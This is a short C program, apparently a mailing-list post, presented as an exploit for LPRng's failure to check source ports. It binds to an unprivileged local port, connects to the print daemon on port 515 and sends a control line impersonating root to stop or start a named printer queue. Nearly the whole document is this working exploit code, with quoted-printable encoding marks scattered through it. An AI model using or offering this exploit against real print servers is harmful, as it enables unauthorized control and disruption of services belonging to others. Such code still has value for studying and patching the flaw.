---- start lpcontrol.c ----------------------------------------------
/* Exploit for lprng's source port check failure.
 * Written and tested on Debian GNU/Linux
 *
 * Chris Leishman <masklin@debian.org>
 */


#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>


#define SRC_PORT 2056
#define HOST "127.0.0.1"
#define DST_PORT 515


int main(int argc, char **argv)
{
	int sock;
	struct sockaddr_in dest_sin;
	struct sockaddr_in src_sin;
	struct hostent *hp;
	unsigned long ipnum;
	char line[256];
	int mode =3D 0;

	if (argc < 2)
	{
		fprintf(stderr, "Usage: %s printer [stop|start]\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	if (argc >=3D 3)
	{
		if (!strcmp(argv[2], "start"))
			mode =3D 1;
		else if (strcmp(argv[2], "stop"))
		{
			fprintf(stderr, "Invalid mode.  Use stop or start.\n");
			fprintf(stderr, "Usage: %s printer [stop|start]\n", argv[0]);
			exit(EXIT_FAILURE);
		}
	}
	=09
	snprintf(line, sizeof(line), "%c%s root %s %s\n",=20
	         6, argv[1], (mode)? "start":"stop", argv[1]);

	memset(&dest_sin, 0, sizeof(struct sockaddr_in));
	dest_sin.sin_port =3D htons((short) DST_PORT);

	ipnum =3D (unsigned long) inet_addr(HOST);
	if (ipnum !=3D ((unsigned long) INADDR_NONE))
	{
		dest_sin.sin_family =3D AF_INET;
		dest_sin.sin_addr.s_addr =3D ipnum;
	}
	else
	{
		if ((hp =3D gethostbyname(HOST)) =3D=3D NULL)
		{
			fprintf(stderr, "Host lookup failed.\n");
			exit(EXIT_FAILURE);
		}

		dest_sin.sin_family =3D hp->h_addrtype;
		memcpy(&dest_sin.sin_addr.s_addr,hp->h_addr_list[0],
		   (size_t)hp->h_length);
	}

	if ((sock =3D socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("Socket call failed");
		exit(EXIT_FAILURE);
	}

	src_sin.sin_family =3D AF_INET;
	src_sin.sin_addr.s_addr =3D INADDR_ANY;
	src_sin.sin_port =3D htons((u_short) SRC_PORT);

	if ((bind(sock, (struct sockaddr *)&src_sin, sizeof(src_sin))) < 0)
	{
		perror("Bind failed");
		exit(EXIT_FAILURE);
	}

	if (connect(sock, (struct sockaddr *)&dest_sin, sizeof(dest_sin)) < 0)
	{
		close(sock);
		perror("Connect failed");
		exit(EXIT_FAILURE);
	}

	if (write(sock, line, strlen(line)) <=3D 0)
	{
		perror("Write failed");
		exit(EXIT_FAILURE);
	}

	close(sock);

	return EXIT_SUCCESS;
}

---- stop lpcontrol.c -----------------------------------------------
